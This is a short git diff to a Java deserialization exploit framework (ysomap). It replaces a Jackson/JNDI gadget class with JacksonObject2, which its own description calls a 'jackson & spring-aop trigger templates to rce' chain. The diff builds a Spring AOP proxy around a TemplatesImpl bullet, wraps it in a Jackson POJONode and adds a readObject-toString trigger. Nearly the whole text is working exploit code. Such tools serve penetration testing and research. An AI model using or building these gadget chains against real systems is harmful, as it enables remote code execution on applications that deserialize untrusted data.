@@ -2,10 +2,12 @@ package ysomap.payloads.java.jackson;
 
 import com.fasterxml.jackson.databind.node.POJONode;
 import ysomap.bullets.Bullet;
-import ysomap.bullets.jdk.LdapAttributeBullet;
+import ysomap.bullets.jdk.TemplatesImplBullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.payloads.AbstractPayload;
+
+import javax.xml.transform.Templates;
 
 /**
  * @author whocansee
@@ -16,19 +18,20 @@ import ysomap.payloads.AbstractPayload;
 @SuppressWarnings({"rawtypes"})
 @Authors({ Authors.whocansee })
 @Targets({Targets.JDK})
-@Require(bullets = {"LdapAttributeBullet"}, param = false)
-@Dependencies({"jackson"})
-@Details("jackson trigger jndi to rce")
-public class JacksonObject1 extends AbstractPayload<Object> {
+@Require(bullets = {"TemplatesImplBullet"}, param = false)
+@Dependencies({"spring-aop", "jackson"})
+@Details("jackson & spring-aop trigger templates to rce")
+public class JacksonObject2 extends AbstractPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return LdapAttributeBullet.newInstance(args);
+        return TemplatesImplBullet.newInstance(args);
     }
 
     @Override
     public Object pack(Object obj) throws Exception {
-        POJONode node = new POJONode(obj);
+        Object proxy = PayloadHelper.makeSpringAOPProxy(Templates.class, obj);;
+        POJONode node = new POJONode(proxy);
         return PayloadHelper.makeReadObjectToStringTrigger(node);
     }
 }
